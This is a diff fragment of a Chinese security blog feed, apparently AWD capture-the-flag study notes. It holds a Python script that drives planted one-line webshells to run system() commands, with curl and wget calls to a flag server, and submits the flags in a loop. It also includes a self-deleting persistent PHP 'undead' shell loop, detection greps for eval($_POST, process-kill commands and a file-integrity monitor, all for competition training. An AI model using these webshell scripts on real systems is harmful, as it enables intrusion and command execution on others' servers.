class="string">&quot;unsafe&quot;</span>);%&gt;</span><br></pre></td></tr></table></figure>
-
-<p><strong>批量脚本</strong></p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"> <span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line"><span class="keyword">from</span> http <span class="keyword">import</span> cookies</span><br><span class="line"><span class="keyword">import</span> sys,requests,base64,time</span><br><span class="line"><span class="keyword">from</span> matplotlib.pyplot <span class="keyword">import</span> flag</span><br><span class="line">urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) <span class="comment">#禁用安全请求警告</span></span><br><span class="line"><span class="comment">#利用一句话木马得到flag</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#加载一句话地址的文件</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shell_list</span>(<span class="params">filepath</span>):</span><br><span class="line">    <span class="comment">#格式 http://192.168.174.128/shell.php</span></span><br><span class="line">    <span class="comment">#返回列表</span></span><br><span class="line">    <span class="keyword">try</span> : </span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(filepath,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            data = f.readlines()</span><br><span class="line">            <span class="keyword">return</span> data</span><br><span class="line">    <span class="keyword">except</span> : </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;File&quot;</span>+filepath+<span class="string">&quot; Not Found!&quot;</span>) </span><br><span class="line">        sys.exit()</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getflag</span>(<span class="params">filepath</span>):</span><br><span class="line">    file = <span class="string">&#x27;flag&#x27;</span>+<span class="built_in">str</span>(time.time())[-<span class="number">5</span>:]+<span class="string">&#x27;.txt&#x27;</span></span><br><span class="line">    <span class="comment">#加载shell地址</span></span><br><span class="line">    <span class="built_in">list</span> = shell_list(filepath)</span><br><span class="line">    <span class="comment">#访问 执行查看flag命令  linux就是cat</span></span><br><span class="line">    <span class="comment"># get方式</span></span><br><span class="line">    <span class="comment"># getflag_cmd =&#x27;echo system(&quot;cat /flag&quot;);&#x27;</span></span><br><span class="line">    <span class="comment"># getflag_cmd =&#x27;echo system(&quot;wget -q -O - http://192.168.1.146:9898/flag&quot;);&#x27;                          		# post方式                   </span></span><br><span class="line">    passwd=<span class="string">&quot;dbapp#2020&quot;</span> <span class="comment">#木马密码</span></span><br><span class="line">    payload =  &#123;passwd: <span class="string">&#x27;system(&quot;curl http://10.0.1.2?token=XFMDKLVJ&quot;);&#x27;</span>&#125;</span><br><span class="line">    <span class="keyword">for</span> url <span class="keyword">in</span> <span class="built_in">list</span>:</span><br><span class="line">        <span class="comment">#url  = url.strip(&#x27;\r\n&#x27;) + &quot;?x=&quot; +getflag_cmd            #get方式</span></span><br><span class="line">        url  = url.strip(<span class="string">&#x27;\r\n&#x27;</span>)                                  <span class="comment">#post方式</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment">#res = requests.get(url=url,timeout=5)                #get方式</span></span><br><span class="line">            res = requests.post(url=url,data=payload,timeout=<span class="number">5</span>)   <span class="comment">#post方式</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">print</span>(url+<span class="string">&quot;[ - ] request timeout [ - ]&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> res.content:</span><br><span class="line">            content = <span class="built_in">str</span>(res.content,<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">            <span class="keyword">try</span> : </span><br><span class="line">            <span class="comment">#把得到的flag存到flag文件再批量提交</span></span><br><span class="line">                <span class="keyword">with</span> <span class="built_in">open</span>(file,<span class="string">&#x27;a&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                    f.writelines(content+<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">            <span class="keyword">except</span> : </span><br><span class="line">                 <span class="built_in">print</span>(<span class="string">&quot;写flag.txt文件失败！！&quot;</span>)</span><br><span class="line">                 sys.exit()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] getflag sucessed! flag文件:&quot;</span> +file)</span><br><span class="line">    <span class="keyword">return</span> file</span><br><span class="line"></span><br><span class="line"><span class="comment">#批量提交flag</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sentflag</span>(<span class="params">filepath,url</span>):</span><br><span class="line">    filename = getflag(filepath)<span class="comment">#返回存放flag的地址</span></span><br><span class="line">    <span class="comment">#读取存放flag文件</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filename,<span class="string">&#x27;r&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        flags = f.readlines()</span><br><span class="line">        <span class="keyword">for</span> flag <span class="keyword">in</span> flags:</span><br><span class="line">            flag_p=flag.replace(<span class="string">&quot;\n&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">            data=&#123;</span><br><span class="line">                <span class="string">&#x27;atn&#x27;</span>:<span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;id&#x27;</span>:<span class="string">&#x27;2&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;token&#x27;</span>:<span class="string">&#x27;3&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;flag&#x27;</span>:flag_p</span><br><span class="line">            &#125;</span><br><span class="line">            cookie=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>:<span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">                    <span class="string">&#x27;Samesite&#x27;</span>:<span class="string">&#x27;&#x27;</span>,</span><br><span class="line">                    <span class="string">&#x27;php-console-server&#x27;</span>:<span class="string">&#x27;3&#x27;</span>,</span><br><span class="line">                    <span class="string">&#x27;matchToken_131&#x27;</span>:<span class="string">&#x27;4&#x27;</span>,</span><br><span class="line">                    <span class="string">&#x27;adl&#x27;</span>:<span class="string">&#x27;5&#x27;</span>&#125;</span><br><span class="line">            <span class="keyword">try</span> : </span><br><span class="line">                res = requests.post(url, data=data, verify=<span class="literal">False</span>, cookies=cookie)</span><br><span class="line">                <span class="keyword">if</span> res.status_code==<span class="number">200</span> :</span><br><span class="line">                  <span class="built_in">print</span>(<span class="string">&quot;Get flag Success&quot;</span>)</span><br><span class="line">            <span class="keyword">except</span> : </span><br><span class="line">                 <span class="built_in">print</span>(<span class="string">&quot;[ ------------&gt; ] Send Flag Failed [ &lt;----------- ]&quot;</span>)</span><br><span class="line">                 sys.exit()</span><br><span class="line">            </span><br><span class="line">           </span><br><span class="line"><span class="comment">#第一个参数需要一个存放shell的地址，格式 http://192.168.174.128/test.php?x=    </span></span><br><span class="line"><span class="comment">#第二个参数需要提交flag的地址 例如http://1.1.1.1/submit.php?token=xxxx&amp;flag=xxxxx</span></span><br><span class="line"></span><br><span class="line">filepath = <span class="string">&#x27;./bsm_shell.txt&#x27;</span> <span class="comment">#自己创建</span></span><br><span class="line">url = <span class="string">&#x27;https://10.0.0.xx/mx/xx/axx&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">timer</span>(<span class="params">n</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        sentflag(filepath,url)</span><br><span class="line">        time.sleep(n)</span><br><span class="line"></span><br><span class="line">timer(<span class="number">120</span>)</span><br></pre></td></tr></table></figure>
-
-
-
-<h1 id="防御思路"><a href="#防御思路" class="headerlink" title="防御思路"></a>防御思路</h1><h2 id="SSH口令更改"><a href="#SSH口令更改" class="headerlink" title="SSH口令更改"></a>SSH口令更改</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">passwd username    <span class="comment">#ssh口令修改</span></span><br><span class="line"><span class="built_in">set</span> password <span class="keyword">for</span> mycms@localhost = password(<span class="string">&#x27;123&#x27;</span>); <span class="comment">#MySQL密码修改</span></span><br><span class="line">find /var/www//html -path <span class="string">&#x27;*config*’  #查找配置文件中的密码凭证</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="后门查杀"><a href="#后门查杀" class="headerlink" title="后门查杀"></a>后门查杀</h2><p>通过xshell或其他管理</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find /var/www/html -name *.php -mmin -20 <span class="comment">#查看最近20分钟修改文件</span></span><br><span class="line">find ./ -name <span class="string">&#x27;*.php&#x27;</span> | xargs <span class="built_in">wc</span> -l | <span class="built_in">sort</span> -u <span class="comment">#寻找行数最短文件</span></span><br><span class="line">grep -r --include=*.php  <span class="string">&#x27;[^a-z]eval($_POST&#x27;</span>  /var/www/html    <span class="comment">#查包含关键字的php文件</span></span><br><span class="line">find /var/www/html -<span class="built_in">type</span> f -name <span class="string">&quot;*.php&quot;</span> | xargs grep <span class="string">&quot;eval(&quot;</span> |more</span><br></pre></td></tr></table></figure>
-
-<h2 id="不死马查杀"><a href="#不死马查杀" class="headerlink" title="不死马查杀"></a>不死马查杀</h2><p>进行条件竞争或写个脚本直接杀。</p>
-<p>进程查杀</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ps aux | grep www-data</span><br><span class="line"><span class="comment">##</span></span><br><span class="line">ps aux | grep www-data | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs <span class="built_in">kill</span> -9</span><br><span class="line">ps aux | grep www-data | grep -v grep | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs <span class="built_in">kill</span> -9</span><br><span class="line"><span class="comment">##</span></span><br><span class="line">awk ‘&#123;<span class="built_in">print</span> <span class="variable">$2</span>&#125;’</span><br><span class="line">提取字符串行内容的第2个字段，也就是当前示例的进程号</span><br></pre></td></tr></table></figure>
-
-<p>比如写个马来一直杀死不死马进程：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&quot;kill -9 pid;rm -rf .shell.php&quot;</span>); <span class="comment">#pid和不死马名称根据实际情况定</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">ignore_user_abort</span>(<span class="literal">true</span>);</span><br><span class="line">    <span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="title function_ invoke__">unlink</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="string">&#x27;.3.php&#x27;</span>;</span><br><span class="line">    <span class="variable">$code</span> = <span class="string">&#x27;hi springbird !&#x27;</span>;</span><br><span class="line">    <span class="comment">//pass=pass</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$file</span>,<span class="variable">$code</span>);</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">&#x27;touch -m -d &quot;2018-12-01 09:10:12&quot; .3.php&#x27;</span>);</span><br><span class="line">    <span class="comment">//    usleep(5000);</span></span><br><span class="line">          <span class="title function_ invoke__">usleep</span>(<span class="number">1000</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>创建一个和马仔一样的文件夹<br>循环创建</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">dire=<span class="string">&quot;/var/www/html/.base.php/&quot;</span></span><br><span class="line">file=<span class="string">&quot;/var/www/html/.base.php&quot;</span></span><br><span class="line"><span class="built_in">rm</span> -rf <span class="variable">$file</span></span><br><span class="line"><span class="built_in">mkdir</span> <span class="variable">$dire</span></span><br><span class="line"></span><br><span class="line">./xx.sh</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="文件监控"><a href="#文件监控" class="headerlink" title="文件监控"></a>文件监控</h2><p>文件监控可以及时查看木马删除，并删除</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment">#use: python file_check.py ./</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> shutil</span><br><span class="line"><span class="keyword">import</span> ntpath</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">CWD = os.getcwd()</span><br><span class="line">FILE_MD5_DICT = &#123;&#125;      <span class="comment"># 文件MD5字典</span></span><br><span class="line">ORIGIN_FILE_LIST = []</span><br><span class="line"></span><br><span class="line"><span class="comment"># 特殊文件路径字符串</span></span><br><span class="line">Special_path_str = <span class="string">&#x27;drops_JWI96TY7ZKNMQPDRUOSG0FLH41A3C5EXVB82&#x27;</span></span><br><span class="line">bakstring = <span class="string">&#x27;bak_EAR1IBM0JT9HZ75WU4Y3Q8KLPCX26NDFOGVS&#x27;</span></span><br><span class="line">logstring = <span class="string">&#x27;log_WMY4RVTLAJFB28960SC3KZX7EUP1IHOQN5GD&#x27;</span></span><br><span class="line">webshellstring = <span class="string">&#x27;webshell_WMY4RVTLAJFB28960SC3KZX7EUP1IHOQN5GD&#x27;</span></span><br><span class="line">difffile = <span class="string">&#x27;diff_UMTGPJO17F82K35Z0LEDA6QB9WH4IYRXVSCN&#x27;</span></span><br><span class="line"></span><br><span class="line">Special_string = <span class="string">&#x27;drops_log&#x27;</span>  <span class="comment"># 免死金牌</span></span><br><span class="line">UNICODE_ENCODING = <span class="string">&quot;utf-8&quot;</span></span><br><span class="line">INVALID_UNICODE_CHAR_FORMAT = <span class="string">r&quot;\?%02x&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 文件路径字典</span></span><br><span class="line">spec_base_path = os.path.realpath(os.path.join(CWD, Special_path_str))</span><br><span class="line">Special_path = &#123;</span><br><span class="line">    <span class="string">&#x27;bak&#x27;</span> : os.path.realpath(os.path.join(spec_base_path, bakstring)),</span><br><span class="line">    <span class="string">&#x27;log&#x27;</span> : os.path.realpath(os.path.join(spec_base_path, logstring)),</span><br><span class="line">    <span class="string">&#x27;webshell&#x27;</span> : os.path.realpath(os.path.join(spec_base_path, webshellstring)),</span><br><span class="line">    <span class="string">&#x27;difffile&#x27;</span> : os.path.realpath(os.path.join(spec_base_path, difffile)),</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">isListLike</span>(<span class="params">value</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">isinstance</span>(value, (<span class="built_in">list</span>, <span class="built_in">tuple</span>, <span class="built_in">set</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取Unicode编码</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getUnicode</span>(<span class="params">value, encoding=<span class="literal">None</span>, noneToNull=<span class="literal">False</span></span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> noneToNull <span class="keyword">and</span> value <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> NULL</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> isListLike(value):</span><br><span class="line">        value = <span class="built_in">list</span>(getUnicode(_, encoding, noneToNull) <span class="keyword">for</span> _ <span class="keyword">in</span> value)</span><br><span class="line">        <span class="keyword">return</span> value</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(value, unicode):</span><br><span class="line">        <span class="keyword">return</span> value</span><br><span class="line">    <span class="keyword">elif</span> <span class="built_in">isinstance</span>(value, basestring):</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">return</span> unicode(value, encoding <span class="keyword">or</span> UNICODE_ENCODING)</span><br><span class="line">            <span class="keyword">except</span> UnicodeDecodeError, ex:</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    <span class="keyword">return</span> unicode(value, UNICODE_ENCODING)</span><br><span class="line">                <span class="keyword">except</span>:</span><br><span class="line">                    value = value[:ex.start] + <span class="string">&quot;&quot;</span>.join(INVALID_UNICODE_CHAR_FORMAT % <span class="built_in">ord</span>(_) <span class="keyword">for</span> _ <span class="keyword">in</span> value[ex.start:ex.end]) + value[ex.end:]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">return</span> unicode(value)</span><br><span class="line">        <span class="keyword">except</span> UnicodeDecodeError:</span><br><span class="line">            <span class="keyword">return</span> unicode(<span class="built_in">str</span>(value), errors=<span class="string">&quot;ignore&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 目录创建</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mkdir_p</span>(<span class="params">path</span>):</span><br><span class="line">    <span class="keyword">import</span> errno</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        os.makedirs(path)</span><br><span class="line">    <span class="keyword">except</span> OSError <span class="keyword">as</span> exc:</span><br><span class="line">        <span class="keyword">if</span> exc.errno == errno.EEXIST <span class="keyword">and</span> os.path.isdir(path):</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">else</span>: <span class="keyword">raise</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取当前所有文件路径</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getfilelist</span>(<span class="params">cwd</span>):</span><br><span class="line">    filelist = []</span><br><span class="line">    <span class="keyword">for</span> root,subdirs, files <span class="keyword">in</span> os.walk(cwd):</span><br><span class="line">        <span class="keyword">for</span> filepath <span class="keyword">in</span> files:</span><br><span class="line">            originalfile = os.path.join(root, filepath)</span><br><span class="line">            <span class="keyword">if</span> Special_path_str <span class="keyword">not</span> <span class="keyword">in</span> originalfile:</span><br><span class="line">                filelist.append(originalfile)</span><br><span class="line">    <span class="keyword">return</span> filelist</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算机文件MD5值</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">calcMD5</span>(<span class="params">filepath</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(filepath,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            md5obj = hashlib.md5()</span><br><span class="line">            md5obj.update(f.read())</span><br><span class="line">            <span class="built_in">hash</span> = md5obj.hexdigest()</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">hash</span></span><br><span class="line">    <span class="keyword">except</span> Exception, e:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">u&#x27;[!] getmd5_error : &#x27;</span> + getUnicode(filepath)</span><br><span class="line">        <span class="built_in">print</span> getUnicode(e)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            ORIGIN_FILE_LIST.remove(filepath)</span><br><span class="line">            FILE_MD5_DICT.pop(filepath, <span class="literal">None</span>)</span><br><span class="line">        <span class="keyword">except</span> KeyError, e:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取所有文件MD5</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getfilemd5dict</span>(<span class="params">filelist = []</span>):</span><br><span class="line">    filemd5dict = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> ori_file <span class="keyword">in</span> filelist:</span><br><span class="line">        <span class="keyword">if</span> Special_path_str <span class="keyword">not</span> <span class="keyword">in</span> ori_file:</span><br><span class="line">            md5 = calcMD5(os.path.realpath(ori_file))</span><br><span class="line">            <span class="keyword">if</span> md5:</span><br><span class="line">                filemd5dict[ori_file] = md5</span><br><span class="line">    <span class="keyword">return</span> filemd5dict</span><br><span class="line"></span><br><span class="line"><span class="comment"># 备份所有文件</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">backup_file</span>(<span class="params">filelist=[]</span>):</span><br><span class="line">    <span class="comment"># if len(os.listdir(Special_path[&#x27;bak&#x27;])) == 0:</span></span><br><span class="line">    <span class="keyword">for</span> filepath <span class="keyword">in</span> filelist:</span><br><span class="line">        <span class="keyword">if</span> Special_path_str <span class="keyword">not</span> <span class="keyword">in</span> filepath:</span><br><span class="line">            shutil.copy2(filepath, Special_path[<span class="string">&#x27;bak&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="built_in">print</span> <span class="string">u&#x27;---------start------------&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> value <span class="keyword">in</span> Special_path:</span><br><span class="line">        mkdir_p(Special_path[value])</span><br><span class="line">    <span class="comment"># 获取所有文件路径，并获取所有文件的MD5，同时备份所有文件</span></span><br><span class="line">    ORIGIN_FILE_LIST = getfilelist(CWD)</span><br><span class="line">    FILE_MD5_DICT = getfilemd5dict(ORIGIN_FILE_LIST)</span><br><span class="line">    backup_file(ORIGIN_FILE_LIST) <span class="comment"># TODO 备份文件可能会产生重名BUG</span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">u&#x27;[*] pre work end!&#x27;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        file_list = getfilelist(CWD)</span><br><span class="line">        <span class="comment"># 移除新上传文件</span></span><br><span class="line">        diff_file_list = <span class="built_in">list</span>(<span class="built_in">set</span>(file_list) ^ <span class="built_in">set</span>(ORIGIN_FILE_LIST))</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(diff_file_list) != <span class="number">0</span>:</span><br><span class="line">            <span class="comment"># import pdb;pdb.set_trace()</span></span><br><span class="line">            <span class="keyword">for</span> filepath <span class="keyword">in</span> diff_file_list:</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    f = <span class="built_in">open</span>(filepath, <span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line">                <span class="keyword">except</span> Exception, e:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">if</span> Special_string <span class="keyword">not</span> <span class="keyword">in</span> f:</span><br><span class="line">                    <span class="keyword">try</span>:</span><br><span class="line">                        <span class="built_in">print</span> <span class="string">u&#x27;[*] webshell find : &#x27;</span> + getUnicode(filepath)</span><br><span class="line">                        shutil.move(filepath, os.path.join(Special_path[<span class="string">&#x27;webshell&#x27;</span>], ntpath.basename(filepath) + <span class="string">&#x27;.txt&#x27;</span>))</span><br><span class="line">                    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                        <span class="built_in">print</span> <span class="string">u&#x27;[!] move webshell error, &quot;%s&quot; maybe is webshell.&#x27;</span>%getUnicode(filepath)</span><br><span class="line">                    <span class="keyword">try</span>:</span><br><span class="line">                        f = <span class="built_in">open</span>(os.path.join(Special_path[<span class="string">&#x27;log&#x27;</span>], <span class="string">&#x27;log.txt&#x27;</span>), <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">                        f.write(<span class="string">&#x27;newfile: &#x27;</span> + getUnicode(filepath) + <span class="string">&#x27; : &#x27;</span> + <span class="built_in">str</span>(time.ctime()) + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">                        f.close()</span><br><span class="line">                    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                        <span class="built_in">print</span> <span class="string">u&#x27;[-] log error : file move error: &#x27;</span> + getUnicode(e)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 防止任意文件被修改,还原被修改文件</span></span><br><span class="line">        md5_dict = getfilemd5dict(ORIGIN_FILE_LIST)</span><br><span class="line">        <span class="keyword">for</span> filekey <span class="keyword">in</span> md5_dict:</span><br><span class="line">            <span class="keyword">if</span> md5_dict[filekey] != FILE_MD5_DICT[filekey]:</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    f = <span class="built_in">open</span>(filekey, <span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line">                <span class="keyword">except</span> Exception, e:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">if</span> Special_string <span class="keyword">not</span> <span class="keyword">in</span> f:</span><br><span class="line">                    <span class="keyword">try</span>:</span><br><span class="line">                        <span class="built_in">print</span> <span class="string">u&#x27;[*] file had be change : &#x27;</span> + getUnicode(filekey)</span><br><span class="line">                        shutil.move(filekey, os.path.join(Special_path[<span class="string">&#x27;difffile&#x27;</span>], ntpath.basename(filekey) + <span class="string">&#x27;.txt&#x27;</span>))</span><br><span class="line">                        shutil.move(os.path.join(Special_path[<span class="string">&#x27;bak&#x27;</span>], ntpath.basename(filekey)), filekey)</span><br><span class="line">                    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                        <span class="built_in">print</span> <span class="string">u&#x27;[!] move webshell error, &quot;%s&quot; maybe is webshell.&#x27;</span>%getUnicode(filekey)</span><br><span class="line">                    <span class="keyword">try</span>:</span><br><span class="line">                        f = <span class="built_in">open</span>(os.path.join(Special_path[<span class="string">&#x27;log&#x27;</span>], <span class="string">&#x27;log.txt&#x27;</span>), <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">                        f.write(<span class="string">&#x27;diff_file: &#x27;</span> + getUnicode(filekey) + <span class="string">&#x27; : &#x27;</span> + getUnicode(time.ctime()) + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">                        f.close()</span><br><span class="line">                    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                        <span class="built_in">print</span> <span class="string">u&#x27;[-] log error : done_diff: &#x27;</span> + getUnicode(filekey)</span><br><span class="line">                        <span class="keyword">pass</span></span><br><span class="line">        time.sleep(<span class="number">2</span>)</span><br><span class="line">        <span class="comment"># print &#x27;[*] &#x27; + getUnicode(time.ctime())</span></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python jiankong.py  /var/www/html</span><br></pre></td></tr></table></figure>
-
-<p>文件监控脚本：<br><a href="https://www.ctfiot.com/go/?url=aHR0cHM6Ly9naXRodWIuY29tL1RoZUtpbmdPZkR1Y2svRmlsZU1vbml0b3I=">https://github.com/TheKingOfDuck/FileMonitor</a></p>
-<h2 id="WAF"><a href="#WAF" class="headerlink" title="WAF"></a>WAF</h2><p>相当于你给自己的网站上防火墙</p>
-<p>推荐使用<a href="https://github.com/leohearts/awd-watchbird">watchbird</a></p>
-<p>使用命令：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">php watchbird.php --install /var/www/html</span><br></pre></td></tr></table></figure>
-
-<p>运行waf 之后，在网址加上**?watchbird=ui**，就会进入到waf 配置页面然后设置密码</p>
-<p>github上有使用教程</p>
-<h2 id="清除反弹shell"><a href="#清除反弹shell" class="headerlink" title="清除反弹shell"></a>清除反弹shell</h2><p>查看进程</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ps -ef / px -aux</span><br></pre></td></tr></table></figure>
-
-<p>出现www-data权限的/bin/sh一般为nc</p>
-<p>然后杀进程</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">kill</span> `ps -aux | grep www-data | grep apache2 | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span>`</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>AWD</category>
-      </categories>
-      <tags>
-        <tag>渗透</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>AWD学习日记一</title>
     <url>/posts/2fe68c90.html</url>
     <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>AWD到时方恨不会，进一年两年没有打线下赛了，脚本也没有了，工具也没有。赶紧跟着大佬复习一波，做一下笔记。</p>
@@ -791,105 +983,81 @@
       </tags>
   </entry>
   <entry>
-    <title>Win10使用优化</title>
-    <url>/posts/f970716d.html</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>记录一下在win10的 游荡历程，保护一下个人隐私，简化使用，炫酷的大爷可以绕过，希望给各位大爷提供带点有用帮助。勿喷</p>
-<h1 id="关闭自动更新"><a href="#关闭自动更新" class="headerlink" title="关闭自动更新"></a>关闭自动更新</h1><p>相对旧机子，更新后的系统可能会影响电脑的使用体验，所以建议关闭自动更新，当你想更新时子再更新</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.右键&quot;此电脑&quot;，选择&quot;管理&quot;。</span><br><span class="line">2.选择&quot;服务和应用程序=&gt;服务&quot;、然后找到&quot;Windows Update&quot;双击打开 （这里是用名称排序的，从W开始找比较快。）</span><br><span class="line">3.在&quot;常规&quot;选项卡下，把启动类型改为 &quot;禁用&quot;。</span><br><span class="line">4.点击&quot;恢复&quot;选项卡，将&quot;第一次失败&quot;、&quot;第二次失败&quot;、&quot;后续失败&quot;都改为&quot;无操作&quot;，然后点击&quot;确定&quot;（这步非常重要，否则自动更新还会自动开启。</span><br></pre></td></tr></table></figure>
+    <title>AWD学习日记二</title>
+    <url>/posts/1466a239.html</url>
